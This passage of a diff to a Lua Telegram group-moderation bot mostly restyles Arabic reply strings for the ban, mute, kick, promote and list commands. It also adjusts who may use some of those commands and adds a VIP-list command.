             local apid = {string.match(text, "^([Uu][Nn][Bb][Aa][Nn][Aa][Ll][Ll]) @(.*)$")}
             function ungban_by_username(extra, result, success)
               local hash = 'bot:gbanned:'
@@ -2756,7 +2426,7 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
                  texts = '<b>User :</b> '..result.id_..' <b>Has been Globally Unbanned !</b>'
                 else
-                texts = '● - <code>العضو </code>'..result.id_..'<code> تم الغاء حظره من العام</code> ☑️'
+                texts = '• <code>العضو </code>'..result.id_..'<code> تم الغاء حظره من العام</code> ☑️'
                 end
                 database:srem(hash, result.id_)
               else
@@ -2771,14 +2441,14 @@ end
             resolve_username(apid[2],ungban_by_username)
           end
           -----------------------------------------------------------------------------------------------
-          if text:match("^[Uu][Nn][Bb][Aa][Nn][Aa][Ll][Ll] (%d+)$") and is_sudo(msg) then
+          if text:match("^[Uu][Nn][Bb][Aa][Nn][Aa][Ll][Ll] (%d+)$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
             local apbll = {string.match(text, "^([Uu][Nn][Bb][Aa][Nn][Aa][Ll][Ll]) (%d+)$")}
             local hash = 'bot:gbanned:'
               database:srem(hash, apbll[2])
               if database:get('lang:gp:'..msg.chat_id_) then
               texts = '<b>User :</b> '..apbll[2]..' <b>Has been Globally Unbanned !</b>'
             else 
-                texts = '● - <code>العضو </code>'..apbll[2]..'<code> تم الغاء حظره من العام</code> ☑️'
+                texts = '• <code>العضو </code>'..apbll[2]..'<code> تم الغاء حظره من العام</code> ☑️'
 end
               send(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
             end
@@ -2787,25 +2457,25 @@ end
 	if text:match("^[Ss][Ii][Ll][Ee][Nn][Tt]$") and is_mod(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ then
 	function mute_by_reply(extra, result, success)
 	local hash = 'bot:muted:'..msg.chat_id_
-	if is_mod(result.sender_user_id_, result.chat_id_) then
+	if is_vip(result.sender_user_id_, result.chat_id_) then
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*You Can,t [Kick/Ban] Moderators!!*', 1, 'md')
        else
-send(msg.chat_id_, msg.id_, 1, '● - `لا تستطيع كتم الادمنيه والمدراء` ⚠️❌', 1, 'md')
+send(msg.chat_id_, msg.id_, 1, '• `لا تستطيع كتم الادمنيه والمدراء` ⚠️❌', 1, 'md')
 end
     else
     if database:sismember(hash, result.sender_user_id_) then
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _is Already silent._', 1, 'md')
 else 
-   send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..result.sender_user_id_..'* `بالفعل تم كتمه` ⚠️', 1, 'md')
+   send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `بالفعل تم كتمه` ⚠️', 1, 'md')
 end
 	else
          database:sadd(hash, result.sender_user_id_)
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _silent_', 1, 'md')
        else 
-    send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..result.sender_user_id_..'* `تم كتمه` ⚠️', 1, 'md')
+    send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `تم كتمه` ⚠️', 1, 'md')
 end
 	end
     end
@@ -2821,14 +2491,14 @@ end
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*You Can,t [Kick/Ban] Moderators!!*', 1, 'md')
        else
-send(msg.chat_id_, msg.id_, 1, '● - `لا تستطيع كتم الادمنيه والمدراء` ⚠️❌', 1, 'md')
+send(msg.chat_id_, msg.id_, 1, '• `لا تستطيع كتم الادمنيه والمدراء` ⚠️❌', 1, 'md')
 end
     else
 	        database:sadd('bot:muted:'..msg.chat_id_, result.id_)
                   if database:get('lang:gp:'..msg.chat_id_) then
             texts = '<b>User </b><code>'..result.id_..'</code> <b>silent</b>'
           else 
-                        texts = '● - <code>العضو </code>'..result.id_..'<code> تم كتمه</code> ⚠️'
+                        texts = '• <code>العضو </code>'..result.id_..'<code> تم كتمه</code> ⚠️'
 end
 		 chat_kick(msg.chat_id_, result.id_)
 	end
@@ -2850,14 +2520,14 @@ end
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*You Can,t [Kick/Ban] Moderators!!*', 1, 'md')
        else
-send(msg.chat_id_, msg.id_, 1, '● - `لا تستطيع كتم الادمنيه والمدراء` ⚠️❌', 1, 'md')
+send(msg.chat_id_, msg.id_, 1, '• `لا تستطيع كتم الادمنيه والمدراء` ⚠️❌', 1, 'md')
 end
     else
 	        database:sadd('bot:muted:'..msg.chat_id_, apsi[2])
                   if database:get('lang:gp:'..msg.chat_id_) then
 	send(msg.chat_id_, msg.id_, 1, '_User_ *'..apsi[2]..'* _silent_', 1, 'md')
 else 
-    send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..apsi[2]..'* `تم كتمه` ⚠️', 1, 'md')
+    send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..apsi[2]..'* `تم كتمه` ⚠️', 1, 'md')
 end
 	end
     end 
@@ -2870,14 +2540,14 @@ end
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _is not silent._', 1, 'md')
        else 
-send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..result.sender_user_id_..'* `بالفعل تم الغاء كتمه` ☑️', 1, 'md')
+send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `بالفعل تم الغاء كتمه` ☑️', 1, 'md')
 end
 	else
          database:srem(hash, result.sender_user_id_)
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _unsilent_', 1, 'md')
        else 
-   send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..result.sender_user_id_..'* `تم الغاء كتمه` ☑️', 1, 'md')
+   send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `تم الغاء كتمه` ☑️', 1, 'md')
 end
 	end
     end
@@ -2892,7 +2562,7 @@ end
                   if database:get('lang:gp:'..msg.chat_id_) then
             texts = '<b>User </b><code>'..result.id_..'</code> <b>unsilent.!</b>'
           else 
-                        texts = '● - <code>العضو </code>'..result.id_..'<code> تم الغاء كتمه</code> ☑️'
+                        texts = '• <code>العضو </code>'..result.id_..'<code> تم الغاء كتمه</code> ☑️'
 end
           else 
                   if database:get('lang:gp:'..msg.chat_id_) then
@@ -2912,24 +2582,24 @@ end
                   if database:get('lang:gp:'..msg.chat_id_) then
 	send(msg.chat_id_, msg.id_, 1, '_User_ *'..apsi[2]..'* _unsilent_', 1, 'md')
 else 
-   send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..apsi[2]..'* `تم الغاء كتمه` ☑️', 1, 'md')
+   send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..apsi[2]..'* `تم الغاء كتمه` ☑️', 1, 'md')
 end
   end
     -----------------------------------------------------------------------------------------------
     local text = msg.content_.text_:gsub('طرد','kick')
   if text:match("^[Kk][Ii][Cc][Kk]$") and msg.reply_to_message_id_ and is_mod(msg.sender_user_id_, msg.chat_id_) then
       function kick_reply(extra, result, success)
-	if is_mod(result.sender_user_id_, result.chat_id_) then
+	if is_vip(result.sender_user_id_, result.chat_id_) then
                 if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*You Can,t [Kick] Moderators!!*', 1, 'md')
        else 
-         send(msg.chat_id_, msg.id_, 1, '● - `لا تستطيع طرد الادمنيه والمدراء` ⚠️❌', 1, 'md')
+         send(msg.chat_id_, msg.id_, 1, '• `لا تستطيع طرد الادمنيه والمدراء` ⚠️❌', 1, 'md')
 end
   else
                 if database:get('lang:gp:'..msg.chat_id_) then
         send(msg.chat_id_, msg.id_, 1, '*User* _'..result.sender_user_id_..'_ *Kicked.*', 1, 'md')
       else 
-        send(msg.chat_id_, msg.id_, 1, '● - `العضو` '..result.sender_user_id_..' `تم طرده` ⚠️', 1, 'md')
+        send(msg.chat_id_, msg.id_, 1, '• `العضو` '..result.sender_user_id_..' `تم طرده` ⚠️', 1, 'md')
 end
         chat_kick(result.chat_id_, result.sender_user_id_)
         end
@@ -2945,13 +2615,13 @@ end
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*You Can,t [Kick] Moderators!!*', 1, 'md')
        else
-send(msg.chat_id_, msg.id_, 1, '● - لا تستطيع طرد الادمنيه والمدراء ⚠️❌', 1, 'md')
+send(msg.chat_id_, msg.id_, 1, '• لا تستطيع طرد الادمنيه والمدراء ⚠️❌', 1, 'md')
 end
     else
                   if database:get('lang:gp:'..msg.chat_id_) then
             texts = '<b>User </b><code>'..result.id_..'</code> <b>Kicked.!</b>'
 else
-                        texts = '● - <code>العضو </code>'..result.id_..'<code> تم طرده</code> ⚠️'
+                        texts = '• <code>العضو </code>'..result.id_..'<code> تم طرده</code> ⚠️'
 end
 		 chat_kick(msg.chat_id_, result.id_)
 	end
@@ -2973,14 +2643,14 @@ end
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '*You Can,t [Kick] Moderators!!*', 1, 'md')
        else
-send(msg.chat_id_, msg.id_, 1, '● - لا تستطيع طرد الادمنيه والمدراء ⚠️❌', 1, 'md')
+send(msg.chat_id_, msg.id_, 1, '• لا تستطيع طرد الادمنيه والمدراء ⚠️❌', 1, 'md')
 end
     else
 		 chat_kick(msg.chat_id_, apki[2])
                   if database:get('lang:gp:'..msg.chat_id_) then
 	send(msg.chat_id_, msg.id_, 1, '_User_ *'..apki[2]..'* _Kicked._', 1, 'md')
 else
-    send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..apki[2]..'* `تم طرده` ⚠️', 1, 'md')
+    send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..apki[2]..'* `تم طرده` ⚠️', 1, 'md')
   	end
 	end
 end
@@ -2992,7 +2662,7 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
         send(msg.chat_id_, msg.id_, 1, '*User* _'..result.sender_user_id_..'_ *Add it.*', 1, 'md')
       else 
-        send(msg.chat_id_, msg.id_, 1, '● - `العضو` '..result.sender_user_id_..' `تم اضافته للمجموعه` ☑️', 1, 'md')
+        send(msg.chat_id_, msg.id_, 1, '• `العضو` '..result.sender_user_id_..' `تم اضافته للمجموعه` ☑️', 1, 'md')
    end
    end
     getMessage(msg.chat_id_, msg.reply_to_message_id_,inv_reply)
@@ -3005,7 +2675,7 @@ end
                   if database:get('lang:gp:'..msg.chat_id_) then
             texts = '<b>User </b><code>'..result.id_..'</code> <b>Add it!</b>'
 else
-            texts = '● - <code>العضو </code>'..result.id_..'<code> تم اضافته للمجموعه</code> ☑️'
+            texts = '• <code>العضو </code>'..result.id_..'<code> تم اضافته للمجموعه</code> ☑️'
 end
     add_user(msg.chat_id_, result.id_, 5)
           else 
@@ -3026,7 +2696,7 @@ end
                   if database:get('lang:gp:'..msg.chat_id_) then
 	send(msg.chat_id_, msg.id_, 1, '_User_ *'..apee[2]..'* _Add it._', 1, 'md')
 else
-    send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..apee[2]..'* `تم اضافته للمجموعه` ☑️', 1, 'md')
+    send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..apee[2]..'* `تم اضافته للمجموعه` ☑️', 1, 'md')
   	end
     end
 	-----------------------------------------------------------------------------------------------
@@ -3038,14 +2708,14 @@ else
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _is Already Owner._', 1, 'md')
        else 
-send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..result.sender_user_id_..'* `بالفعل تم رفعه مدير` ☑️', 1, 'md')
+send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `بالفعل تم رفعه مدير` ☑️', 1, 'md')
 end
 	else
          database:sadd(hash, result.sender_user_id_)
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _Promoted as Group Owner._', 1, 'md')
        else 
-   send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..result.sender_user_id_..'* `تم رفعه مدير` ☑️', 1, 'md')
+   send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `تم رفعه مدير` ☑️', 1, 'md')
 end
 	end
     end
@@ -3060,7 +2730,7 @@ end
                   if database:get('lang:gp:'..msg.chat_id_) then
             texts = '<b>User </b><code>'..result.id_..'</code> <b>Promoted as Group Owner.!</b>'
           else 
-                        texts = '● - <code>العضو </code>'..result.id_..'<code> تم رفعه مدير</code> ☑️'
+                        texts = '• <code>العضو </code>'..result.id_..'<code> تم رفعه مدير</code> ☑️'
 end
           else 
                   if database:get('lang:gp:'..msg.chat_id_) then
@@ -3080,7 +2750,7 @@ end
                   if database:get('lang:gp:'..msg.chat_id_) then
 	send(msg.chat_id_, msg.id_, 1, '_User_ *'..apow[2]..'* _Promoted as Group Owner._', 1, 'md')
 else 
-   send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..apow[2]..'* `تم رفعه مدير` ☑️', 1, 'md')
+   send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..apow[2]..'* `تم رفعه مدير` ☑️', 1, 'md')
 end
     end
 	-----------------------------------------------------------------------------------------------
@@ -3092,14 +2762,14 @@ end
 	     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _is not Owner._', 1, 'md')
     else 
-send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..result.sender_user_id_..'* `بالفعل تم تنزيله من المدراء` ⚠️', 1, 'md')
+send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `بالفعل تم تنزيله من المدراء` ⚠️', 1, 'md')
 end
 	else
          database:srem(hash, result.sender_user_id_)
                   if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _Removed from ownerlist._', 1, 'md')
        else 
-    send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..result.sender_user_id_..'* `تم تنزيله من المدراء` ⚠️', 1, 'md')
+    send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `تم تنزيله من المدراء` ⚠️', 1, 'md')
 end
 	end
     end
@@ -3115,7 +2785,7 @@ end
 	     if database:get('lang:gp:'..msg.chat_id_) then
             texts = '<b>User </b><code>'..result.id_..'</code> <b>Removed from ownerlist</b>'
      else 
-                        texts = '● - <code>العضو </code>'..result.id_..'<code> تم تنزيله من المدراء</code> ⚠️'
+                        texts = '• <code>العضو </code>'..result.id_..'<code> تم تنزيله من المدراء</code> ⚠️'
 end
           else 
 	     if database:get('lang:gp:'..msg.chat_id_) then
@@ -3136,7 +2806,7 @@ end
 	     if database:get('lang:gp:'..msg.chat_id_) then
 	send(msg.chat_id_, msg.id_, 1, '_User_ *'..apow[2]..'* _Removed from ownerlist._', 1, 'md')
 else 
-    send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..apow[2]..'* `تم تنزيله من المدراء` ⚠️', 1, 'md')
+    send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..apow[2]..'* `تم تنزيله من المدراء` ⚠️', 1, 'md')
 end
     end
 	-----------------------------------------------------------------------------------------------
@@ -3148,14 +2818,14 @@ end
 	     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _is Already Admin._', 1, 'md')
        else 
-  	send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..result.sender_user_id_..'* `بالفعل تم رفعه ادمن للبوت` ☑️', 1, 'md')
+  	send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `بالفعل تم رفعه ادمن للبوت` ☑️', 1, 'md')
 end
 	else
          database:sadd(hash, result.sender_user_id_)
 	     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _Added to admins._', 1, 'md')
        else 
-  	send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..result.sender_user_id_..'* `تم رفعه ادمن للبوت` ☑️', 1, 'md')
+  	send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `تم رفعه ادمن للبوت` ☑️', 1, 'md')
 end
 	end
     end
@@ -3170,7 +2840,7 @@ end
 		     if database:get('lang:gp:'..msg.chat_id_) then
             texts = '<b>User </b><code>'..result.id_..'</code> <b>Added to admins.!</b>'
           else 
-                        texts = '● - <code>العضو </code>'..result.id_..'<code> تم رفعه ادمن للبوت</code> ☑️'
+                        texts = '• <code>العضو </code>'..result.id_..'<code> تم رفعه ادمن للبوت</code> ☑️'
 end
           else 
 	     if database:get('lang:gp:'..msg.chat_id_) then
@@ -3190,7 +2860,7 @@ end
 		     if database:get('lang:gp:'..msg.chat_id_) then
 	send(msg.chat_id_, msg.id_, 1, '_User_ *'..ap[2]..'* _Added to admins._', 1, 'md')
 else 
-  	send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..ap[2]..'* `تم رفعه ادمن للبوت` ☑️', 1, 'md')
+  	send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..ap[2]..'* `تم رفعه ادمن للبوت` ☑️', 1, 'md')
 end
     end
 	-----------------------------------------------------------------------------------------------
@@ -3202,14 +2872,14 @@ end
 		     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _is not Admin._', 1, 'md')
        else 
-  	send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..result.sender_user_id_..'* `بالفعل تم تنزيله من ادمنيه البوت` ⚠️', 1, 'md')
+  	send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `بالفعل تم تنزيله من ادمنيه البوت` ⚠️', 1, 'md')
 end
 	else
          database:srem(hash, result.sender_user_id_)
 		     if database:get('lang:gp:'..msg.chat_id_) then
          send(msg.chat_id_, msg.id_, 1, '_User_ *'..result.sender_user_id_..'* _Removed from Admins!._', 1, 'md')
        else 
-  	send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..result.sender_user_id_..'* `تم تنزيله من ادمنيه البوت` ⚠️', 1, 'md')
+  	send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..result.sender_user_id_..'* `تم تنزيله من ادمنيه البوت` ⚠️', 1, 'md')
 
 end
 	end
@@ -3226,7 +2896,7 @@ end
 		     if database:get('lang:gp:'..msg.chat_id_) then
             texts = '<b>User </b><code>'..result.id_..'</code> <b>Removed from Admins!</b>'
           else 
-                        texts = '● - <code>العضو </code>'..result.id_..'<code> تم تنزيله من ادمنيه البوت</code> ⚠️'
+                        texts = '• <code>العضو </code>'..result.id_..'<code> تم تنزيله من ادمنيه البوت</code> ⚠️'
 end
           else 
 		     if database:get('lang:gp:'..msg.chat_id_) then
@@ -3247,17 +2917,17 @@ end
 		     if database:get('lang:gp:'..msg.chat_id_) then
 	send(msg.chat_id_, msg.id_, 1, '_User_ *'..ap[2]..'* Removed from Admins!_', 1, 'md')
 else 
-  	send(msg.chat_id_, msg.id_, 1, '● - `العضو` *'..ap[2]..'* `تم تنزيله من ادمنيه البوت` ⚠️', 1, 'md')
+  	send(msg.chat_id_, msg.id_, 1, '• `العضو` *'..ap[2]..'* `تم تنزيله من ادمنيه البوت` ⚠️', 1, 'md')
 end
     end 
 	-----------------------------------------------------------------------------------------------
-	if text:match("^[Mm][Oo][Dd][Ll][Ii][Ss][Tt]$") and is_mod(msg.sender_user_id_, msg.chat_id_) or text:match("^الادمنيه$") and is_mod(msg.sender_user_id_, msg.chat_id_) then
+	if text:match("^[Mm][Oo][Dd][Ll][Ii][Ss][Tt]$") and is_owner(msg.sender_user_id_, msg.chat_id_) or text:match("^الادمنيه$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
     local hash =  'bot:mods:'..msg.chat_id_
 	local list = database:smembers(hash)
   if database:get('lang:gp:'..msg.chat_id_) then
   text = "<b>Mod List:</b>\n\n"
 else 
-  text = "● - <code>قائمه الادمنيه </code>⬇️ :\n\n"
+  text = "• <code>قائمه الادمنيه </code>⬇️ :\n\n"
   end
 	for k,v in pairs(list) do
 	local user_info = database:hgetall('user:'..v)
@@ -3272,7 +2942,34 @@ else
 	   if database:get('lang:gp:'..msg.chat_id_) then
                 text = "<b>Mod List is empty !</b>"
               else 
-                text = "● - <code>لا يوجد ادمنيه</code> ⚠️"
+                text = "• <code>لا يوجد ادمنيه</code> ⚠️"
+end
+    end
+	send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
+end
+
+	if text:match("^[Vv][Ii][Pp][Ll][Ii][Ss][Tt]$") and is_owner(msg.sender_user_id_, msg.chat_id_) or text:match("^الاعضاء المميزين") and is_owner(msg.sender_user_id_, msg.chat_id_) then
+    local hash =  'bot:vipgp:'..msg.chat_id_
+	local list = database:smembers(hash)
+  if database:get('lang:gp:'..msg.chat_id_) then
+  text = "<b>Vip List:</b>\n\n"
+else 
+  text = "• <code>قائمه الاعضاء المميزين </code>⬇️ :\n\n"
+  end
+	for k,v in pairs(list) do
+	local user_info = database:hgetall('user:'..v)
+		if user_info and user_info.username then
+			local username = user_info.username
+			text = text..k.." - @"..username.." ["..v.."]\n"
+		else
+			text = text..k.." - "..v.."\n"
+		end
+	end
+	if #list == 0 then
+	   if database:get('lang:gp:'..msg.chat_id_) then
+                text = "<b>Vip List is empty !</b>"
+              else 
+                text = "• <code>لا يوجد اعضاء مميزين</code> ⚠️"
 end
     end
 	send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
@@ -3285,7 +2982,7 @@ end
   if database:get('lang:gp:'..msg.chat_id_) then
   text = "<b>bad List:</b>\n\n"
 else 
-  text = "● - <code>قائمه الكلمات الممنوعه </code>⬇️ :\n\n"
+  text = "• <code>قائمه الكلمات الممنوعه </code>⬇️ :\n\n"
   end    for i=1, #names do
       text = text..'> `'..names[i]..'`\n'
     end
@@ -3293,7 +2990,7 @@ else
 	   if database:get('lang:gp:'..msg.chat_id_) then
                 text = "<b>bad List is empty !</b>"
               else 
-                text = "● - <code>لا يوجد كلمات ممنوعه</code> ⚠️"
+                text = "• <code>لا يوجد كلمات ممنوعه</code> ⚠️"
 end
     end
 		  send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
@@ -3306,7 +3003,7 @@ end
   if database:get('lang:gp:'..msg.chat_id_) then
   text = "<b>Silent List:</b>\n\n"
 else 
-  text = "● - <code>قائمه المكتومين </code>⬇️ :\n\n"
+  text = "• <code>قائمه المكتومين </code>⬇️ :\n\n"
 end	
 for k,v in pairs(list) do
 	local user_info = database:hgetall('user:'..v)
@@ -3321,7 +3018,7 @@ for k,v in pairs(list) do
 	   if database:get('lang:gp:'..msg.chat_id_) then
                 text = "<b>Mod List is empty !</b>"
               else 
-                text = "● - <code>لا يوجد مكتومين</code> ⚠️"
+                text = "• <code>لا يوجد مكتومين</code> ⚠️"
 end
 end
 	send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
@@ -3333,7 +3030,7 @@ end
   if database:get('lang:gp:'..msg.chat_id_) then
   text = "<b>owner List:</b>\n\n"
 else 
-  text = "● - <code>قائمه المدراء </code>⬇️ :\n\n"
+  text = "• <code>قائمه المدراء </code>⬇️ :\n\n"
 end	
 for k,v in pairs(list) do
 	local user_info = database:hgetall('user:'..v)
@@ -3348,7 +3045,7 @@ for k,v in pairs(list) do
 	   if database:get('lang:gp:'..msg.chat_id_) then
                 text = "<b>owner List is empty !</b>"
               else 
-                text = "● - <code>لا يوجد مدراء</code> ⚠️"
+                text = "• <code>لا يوجد مدراء</code> ⚠️"
 end
 end
 	send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
@@ -3360,7 +3057,7 @@ end
   if database:get('lang:gp:'..msg.chat_id_) then
   text = "<b>ban List:</b>\n\n"
 else 
-  text = "● - <code>قائمه المحظورين </code>⬇️ :\n\n"
+  text = "• <code>قائمه المحظورين </code>⬇️ :\n\n"
 end	
 for k,v in pairs(list) do
 	local user_info = database:hgetall('user:'..v)
@@ -3375,7 +3072,7 @@ for k,v in pairs(list) do
 	   if database:get('lang:gp:'..msg.chat_id_) then
                 text = "<b>ban List is empty !</b>"
               else 
-                text = "● - <code>لا يوجد محظورين</code> ⚠️"
+                text = "• <code>لا يوجد محظورين</code> ⚠️"
 end
 end
 	send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
@@ -3387,7 +3084,7 @@ end
   if database:get('lang:gp:'..msg.chat_id_) then
   text = "<b>Gban List:</b>\n\n"
 else 
-  text = "● - <code>قائمه الحظر العام </code>⬇️ :\n\n"
+  text = "• <code>قائمه الحظر العام </code>⬇️ :\n\n"
 end	
 for k,v in pairs(list) do
     local user_info = database:hgetall('user:'..v)
@@ -3402,7 +3099,7 @@ end
 	   if database:get('lang:gp:'..msg.chat_id_) then
                 text = "<b>Gban List is empty !</b>"
               else 
-                text = "● - <code>لا يوجد محظورين عام</code> ⚠️"
+                text = "• <code>لا يوجد محظورين عام</code> ⚠️"
 end
 end
 	send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
@@ -3414,7 +3111,7 @@ end
   if database:get('lang:gp:'..msg.chat_id_) then
   text = "<b>Admin List:</b>\n\n"
 else 
-  text = "● - <code>قائمه ادمنيه البوت </code>⬇️ :\n\n"
+  text = "• <code>قائمه ادمنيه البوت </code>⬇️ :\n\n"
 end	
 for k,v in pairs(list) do
 	local user_info = database:hgetall('user:'..v)
@@ -3429,7 +3126,7 @@ for k,v in pairs(list) do
 	   if database:get('lang:gp:'..msg.chat_id_) then
                 text = "<b>Admin List is empty !</b>"
               else 
-                text = "● - <code>لا يوجد ادمنيه للبوت</code> ⚠️"
+                text = "• <code>لا يوجد ادمنيه للبوت</code> ⚠️"
 end
 end
 	send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
@@ -3473,7 +3170,7 @@ local function gpro(extra, result, success)
                 if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, "You Have'nt Profile Photo!!", 1, 'md')
     else 
-            send(msg.chat_id_, msg.id_, 1, "● - `لا تملك صوره في حسابك` ⚠️", 1, 'md')
+            send(msg.chat_id_, msg.id_, 1, "• `لا تملك صوره في حسابك` ⚠️", 1, 'md')
 end
    end
    elseif pronumb[2] == '2' then
@@ -3483,7 +3180,7 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, "You Have'nt 2 Profile Photo!!", 1, 'md')
     else 
-            send(msg.chat_id_, msg.id_, 1, "● - `لا تملك صوره 2 في حسابك` ⚠️", 1, 'md')
+            send(msg.chat_id_, msg.id_, 1, "• `لا تملك صوره 2 في حسابك` ⚠️", 1, 'md')
 end
    end
    elseif pronumb[2] == '3' then
@@ -3493,7 +3190,7 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, "You Have'nt 3 Profile Photo!!", 1, 'md')
     else 
-            send(msg.chat_id_, msg.id_, 1, "● - `لا تملك صوره 3 في حسابك` ⚠️", 1, 'md')
+            send(msg.chat_id_, msg.id_, 1, "• `لا تملك صوره 3 في حسابك` ⚠️", 1, 'md')
 end
    end
    elseif pronumb[2] == '4' then
@@ -3503,7 +3200,7 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, "You Have'nt 4 Profile Photo!!", 1, 'md')
     else 
-            send(msg.chat_id_, msg.id_, 1, "● - `لا تملك صوره 4 في حسابك` ⚠️", 1, 'md')
+            send(msg.chat_id_, msg.id_, 1, "• `لا تملك صوره 4 في حسابك` ⚠️", 1, 'md')
 end
    end
    elseif pronumb[2] == '5' then
@@ -3513,7 +3210,7 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, "You Have'nt 5 Profile Photo!!", 1, 'md')
     else 
-            send(msg.chat_id_, msg.id_, 1, "● - `لا تملك صوره 5 في حسابك` ⚠️", 1, 'md')
+            send(msg.chat_id_, msg.id_, 1, "• `لا تملك صوره 5 في حسابك` ⚠️", 1, 'md')
 end
    end
    elseif pronumb[2] == '6' then
@@ -3523,7 +3220,7 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, "You Have'nt 6 Profile Photo!!", 1, 'md')
     else 
-            send(msg.chat_id_, msg.id_, 1, "● - `لا تملك صوره 6 في حسابك` ⚠️", 1, 'md')
+            send(msg.chat_id_, msg.id_, 1, "• `لا تملك صوره 6 في حسابك` ⚠️", 1, 'md')
 end
    end
    elseif pronumb[2] == '7' then
@@ -3533,7 +3230,7 @@ end
                 if database:get('lang:gp:'..msg.chat_id_) then
       send(msg.chat_id_, msg.id_, 1, "You Have'nt 7 Profile Photo!!", 1, 'md')
     else 
-            send(msg.chat_id_, msg.id_, 1, "● - `لا تملك صوره 7 في حسابك` ⚠️", 1, 'md')
+            send(msg.chat_id_, msg.id_, 1, "• `لا تملك صوره 7 في حسابك` ⚠️", 1, 'md')
 end
    end
    elseif pronumb[2] == '8' then
@@ -3543,7 +3240,7 @@ end
